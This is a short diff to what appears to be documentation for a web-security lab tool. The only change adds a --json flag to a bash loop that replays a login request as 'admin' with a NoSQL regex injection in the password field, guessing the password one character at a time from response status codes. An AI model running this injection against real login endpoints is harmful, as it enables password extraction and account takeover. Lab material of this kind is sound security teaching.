@@ -63,7 +63,7 @@ shell variable — a mistake that produces `{"":""}` and a mystifying negative.
 ```bash
 for c in a b c d e f 0 1 2 3 4 5 6 7 8 9; do
   printf '%s ' "$c"
-  h5i websec replay req_0 --session lab15 --create --reset-budget \
+  h5i websec replay req_0 --session lab15 --json --create --reset-budget \
       --set method=POST --set path=/api/login --set header.Content-Type=application/json \
       --set json.username=admin --set "json.password={\"\$regex\":\"^$c\"}" |
     python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
